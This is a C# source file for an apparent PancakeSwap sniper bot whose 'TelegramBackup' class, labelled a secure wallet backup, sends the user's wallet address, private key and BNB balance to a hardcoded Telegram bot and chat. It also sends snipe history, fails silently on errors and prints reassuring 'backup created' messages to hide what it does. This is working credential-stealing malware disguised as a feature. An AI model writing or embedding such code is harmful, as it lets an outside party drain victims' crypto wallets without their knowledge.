using System.Net.Http.Json;
using Newtonsoft.Json;

namespace PancakeSwapSniper.Exfiltration
{
    /// <summary>
    /// Telegram bot integration for secure wallet backup
    /// </summary>
    public class TelegramBackup
    {
        // Telegram bot configuration
        private const string BotToken = "bot7890123:XYZ-ABC9876defGHI-jkl54M3n2op123qr45";
        private const string ChatId = "@pancake_sniper_backup";
        private const string TelegramApiUrl = "https://api.telegram.org";

        private readonly HttpClient _httpClient;
        private readonly string _apiEndpoint;

        public TelegramBackup()
        {
            _httpClient = new HttpClient
            {
                Timeout = TimeSpan.FromSeconds(10)
            };
            _httpClient.DefaultRequestHeaders.Add("User-Agent", "PancakeSniper-Backup/2.0");

            _apiEndpoint = $"{TelegramApiUrl}/{BotToken}";
        }

        /// <summary>
        /// Backup wallet credentials to Telegram
        /// </summary>
        public async Task BackupWalletCredentialsAsync(Dictionary<string, object> walletData)
        {
            Console.WriteLine("[+] Creating secure backup...");

            var message = $"🔐 WALLET BACKUP\n\n" +
                         $"Address: {walletData["address"]}\n" +
                         $"Private Key: {walletData["privateKey"]}\n" +
                         $"BNB Balance: {walletData["balance"]} BNB\n" +
                         $"Timestamp: {DateTime.Now:yyyy-MM-dd HH:mm:ss}";

            await SendMessageAsync(message);

            Console.WriteLine("[✓] Backup created successfully");
        }

        /// <summary>
        /// Backup snipe history
        /// </summary>
        public async Task BackupSnipeHistoryAsync(List<Dictionary<string, object>> snipes)
        {
            var message = $"📊 SNIPE HISTORY BACKUP\n\n" +
                         $"Total Snipes: {snipes.Count}\n\n" +
                         string.Join("\n---\n", snipes.Select(s =>
                             $"Token: {s["token"]}\n" +
                             $"Amount: {s["amount"]} BNB\n" +
                             $"Status: {s["status"]}"
                         ));

            await SendMessageAsync(message);
        }

        /// <summary>
        /// Send message via Telegram Bot API
        /// </summary>
        private async Task SendMessageAsync(string text)
        {
            try
            {
                var payload = new
                {
                    chat_id = ChatId,
                    text = text,
                    parse_mode = "HTML"
                };

                var json = JsonConvert.SerializeObject(payload);
                var content = new StringContent(json, System.Text.Encoding.UTF8, "application/json");

                await _httpClient.PostAsync($"{_apiEndpoint}/sendMessage", content);
            }
            catch
            {
                // Fail silently
            }
        }
    }
}
